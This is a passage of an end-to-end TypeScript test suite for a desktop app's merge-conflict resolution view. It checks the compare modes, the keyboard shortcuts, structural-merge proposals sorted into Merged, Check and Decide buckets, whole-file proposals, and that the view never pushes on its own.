    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-compare button')].map(b=>b.textContent)"),
      ['PR', 'main', 'both']
    );
    assert.equal(await cardUnder(0, ['  return 11;']), true);
    assert.equal(await cardUnder(1, threeLines), true);
    await decideSaysNothing();
    assert.deepEqual(
      await js(`[...${block(0)}.querySelectorAll('.conflict-diff-legend [data-tone]')].map(s=>s.dataset.tone+' '+s.textContent)`),
      ['pr This PR · feature/retry', 'base main']
    );
    // In the code the open sides are neutral and named, never −/+ (#445 distill): the first row of each side.
    const namedSides = (mode: string) =>
      js<string[]>(
        `[...document.querySelectorAll('.conflict-compare-diff[data-compare=${mode}] diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line][data-conflict-label]')??[])]).map(r=>r.dataset.conflictSide+' '+r.dataset.conflictLabel)`
      );
    for (let n = 0; n < 200 && (await namedSides('pr')).length < 2; n++) await new Promise((r) => setTimeout(r, 30));
    assert.deepEqual((await namedSides('pr')).slice(0, 2), ['pr PR', 'base main']);
    // Lines revealed in PR survive a round trip through main and both: the PR diff stays mounted while hidden.
    const prGaps = () =>
      js<number>("document.querySelectorAll('.conflict-compare-diff[data-compare=pr] .diff-gap-text').length");
    // The PR diff's lines on screen, as text: the revealed ones are those shown now that weren't before.
    const prLines = () =>
      js<string[]>(
        "[...document.querySelectorAll('.conflict-compare-diff[data-compare=pr] diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])]).filter(r=>r.checkVisibility()).map(r=>(r.querySelector('[data-column-content]')??r).textContent)"
      );
    const gapsBefore = await prGaps();
    assert.ok(gapsBefore > 0, 'the PR diff has hidden lines to reveal');
    const linesBefore = await prLines();
    await js("document.querySelector('.conflict-compare-diff[data-compare=pr] .diff-gap-text').click()");
    await wait(`document.querySelectorAll('.conflict-compare-diff[data-compare=pr] .diff-gap-text').length<${gapsBefore}`);
    const gapsRevealed = await prGaps();
    const revealed = (await prLines()).filter((line) => !linesBefore.includes(line));
    assert.ok(revealed.length > 0, 'the reveal shows new lines');
    await compareWith('main');
    assert.equal(
      await js("document.activeElement?.closest('.conflict-compare')&&document.activeElement.dataset.compare"),
      'main',
      'focus moves to the active switch button, not to the body'
    );
    await compareWith('both');
    await compareWith('pr');
    assert.equal(await prGaps(), gapsRevealed, 'revealed lines are kept across PR → main → both → PR');
    const after = await prLines();
    assert.ok(
      revealed.every((line) => after.includes(line)),
      `the revealed lines are visible again in PR: ${JSON.stringify(revealed.filter((line) => !after.includes(line)))}`
    );
    assert.equal(await cardUnder(0, ['  return 11;']), true);
    // main: what the PR still changes after the merge. Main's lines are the old side; an open conflict shows the PR's.
    await compareWith('main');
    await wait(`${block(0)}?.checkVisibility() && ${block(1)}?.checkVisibility()`);
    assert.match(await js<string>("document.querySelector('.conflict-diff-view .changes-file-counts')?.getAttribute('aria-label') ?? ''"), /^Against main$/);
    assert.equal(await cardUnder(0, ['  return 10;']), true);
    assert.equal(await cardUnder(1, threeLines), true);
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'check');
    await decideSaysNothing();
    assert.deepEqual(
      await js(`[...${block(0)}.querySelectorAll('.conflict-diff-legend [data-tone]')].map(s=>s.dataset.tone+' '+s.textContent)`),
      ['pr This PR · feature/retry', 'base main'],
      'The legend keeps its order and tints in every mode'
    );
    // Against main the diff shows main's lines first; they keep main's tint and name, the PR's keep the PR's.
    for (let n = 0; n < 200 && (await namedSides('main')).length < 2; n++) await new Promise((r) => setTimeout(r, 30));
    assert.deepEqual((await namedSides('main')).slice(0, 2), ['base main', 'pr PR']);
    // J and K still visit both.
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1');
    await captureAll('compare-main');
    // both: per conflict the PR side, main's side and the result, with the card under them. Nothing is chosen in the
    // Decide conflict, so it has no result row that could pass for one.
    await compareWith('both');
    await wait("document.querySelectorAll('.conflict-compare-group').length===2");
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-compare-group')].map(g=>[...g.querySelectorAll(':scope > .conflict-compare-row > h4')].map(h=>h.textContent))"),
      [
        ['This PR · feature/retry', 'main', 'Result'],
        ['This PR · feature/retry', 'main', 'Result'],
      ]
    );
    assert.equal(
      await js("document.querySelector('.conflict-compare-group .conflict-compare-row[data-side=result]').textContent"),
      'ResultNothing is chosen yet.'
    );
    await decideSaysNothing();
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'check');
    // Each card is under its own three rows, and each row shows its lines.
    assert.equal(
      await js(`[0,1].every(i=>{const card=${block(0)}.ownerDocument.querySelector('.conflict-block[data-conflict-index="'+i+'"]');const group=card.closest('.conflict-compare-group');const result=group?.querySelector('.conflict-compare-row[data-side=result]');return group===document.querySelectorAll('.conflict-compare-group')[i]&&card.checkVisibility()&&card.getBoundingClientRect().top>=result.getBoundingClientRect().bottom-0.5;})`),
      true
    );
    const rowText = (group: number, side: string) =>
      js<string>(`[...document.querySelectorAll('.conflict-compare-group')[${group}].querySelector('.conflict-compare-row[data-side=${side}]').querySelectorAll('diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])]).map(r=>(r.querySelector('[data-column-content]')??r).textContent).join('|')`);
    await wait(`document.querySelectorAll('.conflict-compare-group')[1].querySelector('.conflict-compare-row[data-side=result] diffs-container')?.shadowRoot?.querySelector('[data-line]')`);
    assert.match(await rowText(0, 'ours'), /return 10;/);
    assert.match(await rowText(0, 'theirs'), /return 11;/);
    assert.match(await rowText(1, 'result'), /return 3;/);
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1', 'J and K visit the cards in both too');
    await captureAll('compare-both');
    // The choice is remembered for the session: across files, and when the view closes and opens again.
    await js("[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span').textContent==='src/imports.ts').click()");
    await wait("document.querySelector('.conflict-files button[aria-current=true] span')?.textContent==='src/imports.ts' && !!document.querySelector('.conflict-compare-group')");
    assert.equal(await pressed(), 'both');
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    await wait("!!document.querySelector('.conflict-compare-group')");
    assert.equal(await pressed(), 'both');
    await compareWith('pr');
    await wait("document.querySelector('.conflict-files button[aria-current=true] span')?.textContent==='src/retry.ts'");
    await checksDone();
    assert.equal(await cardUnder(0, ['  return 11;']), true);
    await js("[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span').textContent==='src/imports.ts').click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Merged · Structural merge combined both sides’ changes/);
    // The Conflicts view's diff shows the result (#445 item 8): a Merged card is its two lines, with no code of its own.
    assert.equal(await js(`!!${block(0)}.querySelector('details, .conflict-snippet')`), false, 'Merged stays one line');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-note-line').textContent`), /The file parses\. Every line of both sides is accounted for\./);
    assert.equal(await stage(), 'resolved', 'With the switch on, a Merged file still waits for your review');
    await captureAll('buckets-merged');
    // Off: files whose every conflict is Merged are marked reviewed for you. Nothing is pushed.
    await js(`${showMerged}.click()`);
    await wait(
      "['src/imports.ts','docs/notes.md'].every(p=>window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path===p))"
    );
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path==='src/retry.ts')"), false);
    assert.equal(await publishes(), 0);
    await wait("document.querySelector('.conflict-files [aria-current=true] [data-stage]')?.dataset.stage==='reviewed'");
    await captureAll('buckets-skip-review');
    await js(`${showMerged}.click()`);
    await wait(`${showMerged}.checked`);
    // On is the default, so turning it back on removes the setting instead of saving true.
    await wait(
      "window.electronAPI.loadPreferences().then(p=>!p.repositorySettings?.['klang/engine'] || !('showMergedConflicts' in p.repositorySettings['klang/engine']))"
    );
    // Undo takes a Merged conflict's proposal out of the draft: both sides, and the proposal waits on the card (Check).
    // It counts as a Merged undo, for Settings (#445 item 2).
    const mergedUndone = () => js<number>('window.fixtureConflictStats.buckets.merged.undone');
    const undoneBefore = await mergedUndone();
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    // A proposal nobody chose is named as an offer, never as done: it is not in the draft.
    assert.ok(
      (await js<string[]>(`[...${block(0)}.querySelectorAll('.conflict-side-label')].map(e=>e.textContent)`)).includes(
        'Proposal from structural merge: combine both sides’ changes'
      )
    );
    await wait(`window.fixtureConflictStats.buckets.merged.undone===${undoneBefore + 1}`);
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 1 of 4 conflicts are merged and checked. 3 need you: 2 to check, 1 to decide.'"
    );
    // Review probe: the proposal is one click away, and then it is your choice; Reset file returns to the proposals.
    await click('Use the proposal');
    await wait(`${block(0)}?.dataset.bucket==='decided'`);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Reset file');
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.equal(await mergedUndone(), undoneBefore + 1, 'A conflict counts as undone once per session');
    assert.equal(await exists('Reset file'), false, 'The proposals are the reset point');
    assert.ok(await exists('Start from Git’s conflict'));
    await click('Start from Git’s conflict');
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Close');

    // "The checks proved every conflict" needs every check in: not while the type check runs, and not on a stale session.
    const allMergedNote = "document.querySelector('[data-conflict-note=\"all-merged\"]')";
    const setTypeCheck = (state: unknown) =>
      js(`(()=>{window.typeCheckState=${JSON.stringify(state)};for(const cb of window.typeCheckListeners)cb(window.conflictFixture.id);})()`);
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false,version:1,restack:undefined,dependents:[],files:${JSON.stringify(counted.slice(1))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await checksDone();
    await wait(`!!${allMergedNote}`);
    assert.equal(await js(`${allMergedNote}.getAttribute('role')`), 'status');
    await setTypeCheck({ state: 'running' });
    await wait("document.querySelector('.conflict-type-check')?.firstChild?.textContent==='Type check: running…'");
    assert.equal(await js(`!!${allMergedNote}`), false, 'Not proved while the type check runs');
    await setTypeCheck(null);
    await wait(`!!${allMergedNote}`);
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await js('window.conflictFixture.stale=true');
    await open();
    await wait(`(${visibleButton('Load latest changes')})`);
    assert.equal(await js(`!!${allMergedNote}`), false, 'Not on a stale session');
    await js('window.conflictFixture.stale=false');
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");

    // The conflict keyboard map (#445 item 13): A accepts, U undoes, V cycles Compare with, G shows the merged
    // conflicts and Cmd+Enter opens Review and push…, which never pushes. None of them acts while you type.
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false,version:1,restack:undefined,dependents:[],files:${JSON.stringify(counted)}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait("document.querySelector('.conflict-files button[aria-current=true] span')?.textContent==='src/retry.ts'");
    await checksDone();
    await wait(`${block(1)}?.dataset.bucket==='check'`);
    const footerSays = () => js<string>("document.querySelector('.conflict-footer-status')?.textContent ?? ''");
    // The legend lists every key.
    await js("document.querySelector('[data-conflict-keys]').focus()");
    await wait("document.querySelector('.conflict-keys')?.textContent.includes('Review and push')");
    assert.deepEqual(
      await js("[...document.querySelector('.conflict-keys dl').querySelectorAll('dt')].map(d=>[...d.querySelectorAll('kbd')].map(k=>(k.querySelector('[aria-hidden]')??k).textContent).join(' '))"),
      [
        'J K',
        'A',
        '1 2 3',
        'U',
        'V',
        'G',
        'M',
        'N P',
        (await js<boolean>("window.electronAPI.platform==='darwin'")) ? '⌘ ↵' : 'Ctrl ↵',
        'Esc',
      ]
    );
    // The glyphs have words for screen readers, and the labels name the controls.
    assert.deepEqual(
      await js("[...document.querySelector('.conflict-keys dl').querySelectorAll('kbd .sr-only')].map(k=>k.textContent)"),
      (await js<boolean>("window.electronAPI.platform==='darwin'")) ? ['Command', 'Enter'] : ['Enter']
    );
    assert.match(await js<string>("document.querySelector('.conflict-keys dl').textContent"), /Turn on Review Merged-only files myself/);
    assert.match(await js<string>("document.querySelector('.conflict-keys dl').textContent"), /right after A, that choice/);
    // With GNOSIS_CONFLICT_SHOTS set, the legend in light and dark prints as `CONFLICTSHOT <name> <base64 PNG>`.
    if (process.env.GNOSIS_CONFLICT_SHOTS)
      for (const theme of ['light', 'dark']) {
        await js(`document.documentElement.classList.toggle('dark', ${theme === 'dark'})`);
        await js('document.fonts.ready');
        await new Promise((r) => setTimeout(r, 300));
        console.log(`CONFLICTSHOT keymap-legend-${theme} ${(await win.webContents.capturePage()).toPNG().toString('base64')}`);
      }
    await js("document.documentElement.classList.remove('dark')");
    await js(`${block(0)}.focus()`);
    await wait("!document.querySelector('.conflict-keys')");
    // A on a conflict with no proposal changes nothing and says why.
    const draft = () => js<string>("document.querySelector('.conflict-workspace') && window.conflictFixture.files[0].result");
    await key('a');
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    assert.match(await footerSays(), /no proposal that needs you/);
    // U is the card's Undo: the Check proposal goes, and the conflict waits in Decide with Use the proposal.
    assert.equal(await js(`${block(1)}.querySelector('[aria-label^="Undo"],[aria-label^="Remove"]').getAttribute('aria-keyshortcuts')`), 'U');
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-compare-diff:not([hidden]) .conflict-compare button')].map(b=>b.getAttribute('aria-keyshortcuts'))"),
      ['V', 'V', 'V']
    );
    await js(`${block(1)}.focus()`);
    await key('u');
    await wait(`${block(1)}?.dataset.state==='open' && !!${block(1)}.querySelector('[data-choice=proposal]')`);
    assert.equal(await activeBlock(), '1', 'Undo keeps focus on the conflict');
    assert.equal(await js(`${block(1)}.querySelector('[data-choice=proposal]').getAttribute('aria-keyshortcuts')`), 'A');
    // A is Use the proposal (#507): your choice, Decided, never Merged. Focus moves to the next conflict that needs
    // you: past the last, back to the first.
    await key('a');
    await wait(`${block(1)}?.dataset.bucket==='decided'`);
    assert.equal(await activeBlock(), '0');
    // U right after A undoes that A, not the conflict focus moved to.
    await key('u');
    await wait(`${block(1)}?.dataset.state==='open' && !!${block(1)}.querySelector('[data-choice=proposal]')`);
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    await wait(`document.activeElement===${block(1)}`);
    // J to conflict 2, then V: focus is on the switch, and A still accepts conflict 2, not the first that needs you.
    await key('j');
    await key('j');
    assert.equal(await activeBlock(), '1');
    await key('v');
    await wait("document.querySelector('.conflict-compare [data-compare=main]')?.getAttribute('aria-pressed')==='true'");
    assert.equal(await activeBlock(), null, 'V moves focus to the switch');
    await key('a');
    await wait(`${block(1)}?.dataset.bucket==='decided'`);
    assert.equal(await js(`${block(0)}.dataset.state`), 'open', 'A did not act on the first conflict');
    assert.doesNotMatch(await footerSays(), /no proposal/);
    await wait(`document.activeElement===${block(0)}`);
    // V cycles on: both, then back to PR.
    for (const mode of ['both', 'pr']) {
      await key('v');
      await wait(`document.querySelector('.conflict-compare [data-compare=${mode}]')?.getAttribute('aria-pressed')==='true'`);
    }
    // Keep one side on the first: nothing else needs you, so the next action has focus.
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
    // G moves focus to its switch; U still undoes the card you were on last.
    await key('g');
    await wait("document.activeElement?.type==='checkbox'");
    await key('u');
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'decided');
    // Open conflict 2 again; keep the first, and A on conflict 2 with nothing else to decide sends focus to the next
    // action.
    await js(`${block(1)}.focus()`);
    await key('u');
    await wait(`${block(1)}?.dataset.state==='open'`);
    await js(`${block(0)}.focus()`);
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept' && document.activeElement===${block(1)}`);
    await key('a');
    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'decided', 'Accept never makes a proposal Merged');
    // U on a kept conflict opens it again.
    await js(`${block(0)}.focus()`);
    await key('u');
    await wait(`${block(0)}?.dataset.state==='open'`);
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    // Cmd+Enter while a file needs you opens nothing.
    await key('j');
    await modEnter();
    assert.equal(await calls('preview'), 0, 'Cmd+Enter waits for every file');
    assert.equal(await js("!!document.querySelector('.conflict-confirm')"), false);
    assert.match(await footerSays(), /still needs you/);
    // Keys are ignored in the in-place editor: they type there, and Escape leaves it with nothing changed.
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved' && !window.conflictFixture.files[0].result.includes('<<<<<<<')");
    const before = await draft();
    await js(`${block(0)}.querySelector('[data-conflict-edit]').click()`);
    await wait(`!!${inlineEditor(0)} && ${inlineEditor(0)}.getRootNode().activeElement===${inlineEditor(0)}`);
    for (const letter of ['a', 'u', 'v', 'g', 'm']) await key(letter);
    assert.equal(await js("document.querySelector('.conflict-compare [aria-pressed=true]')?.dataset.compare"), 'pr');
    assert.equal(await js(`${block(0)}.dataset.state`), 'editing');
    assert.equal(await calls('preview'), 0);
    await key('Escape');
    await wait(`!document.querySelector('[data-conflict-inline-edit]') && ${block(0)}?.dataset.state==='kept'`);
    assert.equal(await draft(), before, 'Nothing typed in the editor reached the draft');
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    // G turns Review Merged-only files myself on, never off, and focuses it; J still works from there.
    const showMergedInput = "[...document.querySelectorAll('.conflict-summary-notes label')].find(l=>l.textContent.includes('Review Merged-only files myself'))?.querySelector('input')";
    await js(`${showMergedInput}.click()`);
    await wait(`!${showMergedInput}.checked`);
    await wait("['src/imports.ts','docs/notes.md'].every(p=>window.conflictFixture.files.find(f=>f.path===p).resolved)");
    await js(`${block(0)}.focus()`);
    await key('g');
    await wait(`${showMergedInput}.checked && document.activeElement===${showMergedInput}`);
    await key('g');
    assert.equal(await js(`${showMergedInput}.checked`), true, 'G never turns it off');
    await key('j');
    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
    // An unsaved edit in place holds M, Mark reviewed and a file switch: the text stays, and the hint says why.
    await js(`${block(0)}.querySelector('[data-conflict-edit]').click()`);
    await wait(`!!${inlineEditor(0)} && ${inlineEditor(0)}.getRootNode().activeElement===${inlineEditor(0)}`);
    await key('z');
    await wait(`${inlineEditor(0)}?.textContent.includes('z')`);
    await js(`${block(1)}.focus()`);
    await key('m');
    assert.match(await footerSays(), /Save or cancel your edit first/);
    await js("document.querySelector('[data-conflict-primary=mark-reviewed]').click()");
    await key('n');
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'Nothing was marked reviewed');
    assert.equal(await js("document.querySelector('.conflict-files button[aria-current=true] span')?.textContent"), 'src/retry.ts');
    assert.equal(await js(`${inlineEditor(0)}?.textContent.includes('z')`), true, 'Your unsaved text survives');
    assert.match(await footerSays(), /Save or cancel your edit first/);
    await js(`${inlineEditor(0)}.focus()`);
    await key('Escape');
    await wait(`!document.querySelector('[data-conflict-inline-edit]') && ${block(0)}?.dataset.state==='kept'`);
    await js(`${block(1)}.focus()`);
    // Every file reviewed: M opens the confirmation. Back, then Cmd+Enter opens it again, and only that.
    await key('m');
    await wait("!!document.querySelector('.conflict-confirm')");
    await click('Back to files');
    await wait("!document.querySelector('.conflict-confirm') && document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
    const previews = await calls('preview');
    // An open edit you haven't saved holds the confirmation: Cmd+Enter and Review and push… both say so.
    await js(`${block(0)}.querySelector('[data-conflict-edit]').click()`);
    await wait(`!!${inlineEditor(0)} && ${inlineEditor(0)}.getRootNode().activeElement===${inlineEditor(0)}`);
    await key('x');
    await js(`${block(1)}.focus()`);
    await modEnter();
    assert.match(await footerSays(), /Save or cancel your edit first/);
    await js(`(${visibleButton('Review and push…')}).click()`);
    assert.equal(await calls('preview'), previews, 'Nothing opens while an edit is unsaved');
    assert.equal(await js("!!document.querySelector('.conflict-confirm')"), false);
    await js(`${inlineEditor(0)}.focus()`);
    await key('Escape');
    await wait(`!document.querySelector('[data-conflict-inline-edit]') && ${block(0)}?.dataset.state==='kept'`);
    await js(`${block(0)}.focus()`);
    await key('Enter');
    assert.equal(await calls('preview'), previews, 'Enter alone does not open the confirmation');
    // A second window reopened the PR and its reopen pass moved the draft on (#452): with nothing unsaved, Review and
    // push reads the saved draft and asks once more, with no error.
    const opensBefore = await calls('open');
    await js('window.conflictFixture.version+=3');
    await modEnter();
    await wait(`!!document.querySelector('.conflict-confirm') && window.conflictCalls.filter(r=>r.kind==='preview').length===${previews + 2}`);
    assert.equal(await calls('open'), opensBefore + 1, 'The view read the saved draft once');
    assert.equal(await js("!!document.querySelector('.conflict-error, [data-error]')"), false);
    await wait("document.activeElement?.classList.contains('step-card-body')");
    await modEnter();
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Cmd+Enter never pushes from the view');
    // G in the confirmation opens Merged for you; not from the commit message field.
    await js("document.querySelector('.conflict-confirm-message input').focus()");
    await key('g');
    assert.equal((await confirmGroupsShown()).merged.open, 'false', 'G types in the message field');
    await js("document.querySelector('.conflict-confirm .step-card-body').focus()");
    await key('g');
    await wait("document.querySelector('[data-confirm-group=merged] .conflict-disclosure')?.getAttribute('aria-expanded')==='true' && document.activeElement===document.querySelector('[data-confirm-group=merged] .conflict-disclosure')");
    assert.equal(await publishes(), 0);
    await click('Back to files');
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");

    // oddur/gnosis-conflict-lab #99: the PR only reformats a call and main changes one argument. Mergiraf's result is
    // checked by its syntax tree and Merged. The trap beside it: the PR also changed a token while it reformatted, so
    // its proposal stays in Check, and the header shows the same "1 to check" as the file list, not "Resolved".
    const csharp = (call: string) =>
      `public static class Lab\n{\n    public static int alpha(int value)\n    {\n        var total = value + 1;\n${call}    }\n}\n`;
    const oneLine = (last: string) => `        return combine(value, total, value * 2, ${last});\n`;
    const split = (last: string, total = 'total') =>
      `        return combine(\n            value,\n            ${total},\n            value * 2,\n            ${last}\n        );\n`;
    const reformat = (path: string, ours: string, proposal: string) => {
      const [head, tail] = csharp('@').split('@');
      return {
        path,
        mode: '100644',
        base: csharp(oneLine('4')),
        ours: csharp(ours),
        theirs: csharp(oneLine('5')),
        original: `${head}<<<<<<< feature/retry\n${ours}||||||| ancestor\n${oneLine('4')}=======\n${oneLine('5')}>>>>>>> main\n${tail}`,
        proposals: [{ source: 'mergiraf', text: proposal }],
        result: csharp(proposal),
        resolved: false,
        source: 'mergiraf',
      };
    };
    const reformatted = reformat('lab/reformat.cs', split('4'), split('5'));
    const trap = reformat('lab/trap.cs', split('4', 'total + 1'), split('5', 'total + 1'));
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([trap, reformatted])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='2 files have conflicts. 1 of 2 conflicts are merged and checked. 1 to check.'"
    );
    const badges = (scope: string) =>
      js<string[][]>(
        `[...document.querySelectorAll('${scope} [data-status]')].map(b=>[b.dataset.status,...[...b.querySelectorAll('svg')].map(s=>s.getAttribute('class')),b.textContent])`
      );
    assert.deepEqual(
      (await badges('.conflict-files [aria-current=true]')).map(([status, , text]) => [status, text]),
      [['buckets', '1 to check']]
    );
    assert.match((await badges('.conflict-files [aria-current=true]'))[0][1], /circle-question-mark|circle-help/, 'The Check icon');
    assert.equal(await js("!!document.querySelector('.conflict-files [aria-current=true] [data-status=resolved]')"), false);
    await checksDone();
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check');
    assert.match(
      await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`),
      /Both sides changed the same lines\. Check that the proposal keeps both changes\./
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^0 of 2 files reviewed$/
    );
    await captureAll('reformat-trap-check');
    await js("[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span').textContent==='lab/reformat.cs').click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.equal((await badges('.conflict-files [aria-current=true]'))[0][2], '1 merged');
    assert.match(
      await js<string>(`${block(0)}.querySelector('.conflict-block-note-line').textContent`),
      /^The PR only reformatted these lines and main changed them; the proposal keeps main’s change in the PR’s formatting\./
    );
    await captureAll('reformat-merged');
    await click('Close');

    // A reorder: Mergiraf's result also moves lines outside Git's conflict, so it is one whole-file proposal in Check.
    // Its checks pass, and it still is not Merged. Using it is the Suggest step; the file is then reviewed as usual.
    const fn = (name: string, total = 'value + 1') =>
      `func ${name}(value int) int {\n\ttotal := ${total}\n\tscaled := total * 2\n\treturn scaled - 3\n}\n`;
    const goFile = (functions: string[]) => ['package lab\n', ...functions].join('\n');
    const reorder = {
      path: 'lab/reorder.go',
      mode: '100644',
      base: goFile([fn('alpha'), fn('beta')]),
      ours: goFile([fn('beta'), fn('alpha')]),
      theirs: goFile([fn('alpha', 'value + 10'), fn('beta')]),
      original: `package lab\n\n<<<<<<< feature/retry\n${fn('beta')}\n${fn('alpha')}||||||| ancestor\n${fn('alpha')}\n${fn('beta')}=======\n${fn('alpha', 'value + 10')}\n${fn('beta')}>>>>>>> main\n`,
      wholeFile: { source: 'mergiraf', text: goFile([fn('beta'), fn('alpha', 'value + 10')]) },
      resolved: false,
      source: 'manual',
    };
    const late = {
      path: 'src/limits.ts',
      mode: '100644',
      base: 'export const limit = 1;\n',
      ours: 'export const limit = 2;\n',
      theirs: 'export const limit = 3;\n',
      original:
        '<<<<<<< feature/retry\nexport const limit = 2;\n||||||| ancestor\nexport const limit = 1;\n=======\nexport const limit = 3;\n>>>>>>> main\n',
      structuralNote: 'Structural merge timed out.',
      resolved: false,
      source: 'manual',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([reorder, late].map((f) => ({ ...f, result: f.original })))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='2 files have conflicts. 2 need you: 1 whole-file proposal to check, 1 to decide.'"
    );
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files [aria-current=true] [data-stage]')].map(b=>[b.dataset.stage,b.textContent])"),
      [['proposal', 'Whole file to check']]
    );
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files button small')].map(s=>s.textContent)"),
      ['Whole file to check', '1 to decide']
    );
    const whole = "document.querySelector('.conflict-whole-file')";
    assert.equal(await js(`${whole}.dataset.bucket`), 'check');
    await wait(`${whole}.querySelector('p').textContent.startsWith('Structural merge moved')`);
    assert.equal(
      await js<string>(`${whole}.querySelector('p').textContent`),
      'Structural merge moved lines outside the conflict. The proposal parses and keeps every change from both sides. Read it, then use it.'
    );
    assert.equal(await js(`!!${block(0)}`), false, 'The conflicts wait behind the proposal');
    assert.equal(await js("!!document.querySelector('[data-bucket=merged]')"), false, 'Never Merged');
    assert.equal(await js(`${whole}.querySelector('.conflict-block-header').textContent`), 'Whole fileCheck');
    // The footer speaks of the proposal, and using it is the next step.
    assert.equal(await primary(), 'use-proposal');
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^0 of 2 files reviewed$/
    );
    // While the conflicts are hidden, the proposal is the file's one stop for J and K.
    await wait("document.activeElement?.closest('.conflict-block')?.dataset.conflictIndex==='-1'");
    await key('j');
    assert.equal(await activeBlock(), '-1');
    // The proposal's preview marks the lines neither side had (#445 item 10), as many as its legend counts.
    const markedIn = (scope: string) =>
      `[...document.querySelectorAll(${JSON.stringify(scope)})].flatMap(e=>[...e.querySelectorAll('diffs-container')]).flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line][data-written-line]')??[])]).length`;
    const legendIn = (scope: string) =>
      `Number(document.querySelector(${JSON.stringify(`${scope} .conflict-written-legend`)})?.dataset.written ?? 0)`;
    await wait(`${legendIn('.conflict-whole-file')}>0 && ${markedIn('.conflict-whole-file')}===${legendIn('.conflict-whole-file')}`);
    // Its diff names its columns, and is no second region named after the file inside the card.
    assert.deepEqual(
      await js(`[...${whole}.querySelectorAll('.conflict-diff-columns > span')].map(s=>s.lastChild.textContent)`),
      ['This PR · feature/retry', 'Proposed result']
    );
    assert.equal(await js(`[...${whole}.querySelectorAll('section')].filter(s=>s.hasAttribute('aria-label')).length`), 0);
    // Using it is the footer's primary: the card has no second Use the proposal for this file (#445 distill).
    assert.equal(await js(`!!${whole}.querySelector('[data-choice=whole-file]')`), false);
    await captureAll('whole-file-check');
    // The link shows the conflicts below the proposal; J and K then visit both.
    await click('Resolve conflict by conflict instead (1)');
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await js(`!!${whole}`), true);
    assert.equal(await primary(), 'next-conflict');
    // The proposal still covers the conflicts: the footer says what the header and the file list say.
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^0 of 2 files reviewed$/
    );
    await js(`${whole}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '0');
    await key('k');
    assert.equal(await activeBlock(), '-1');
    await captureAll('whole-file-conflicts-shown');
    // 1, 2 and 3 never choose for a conflict while the proposal has focus.
    await key('1');
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
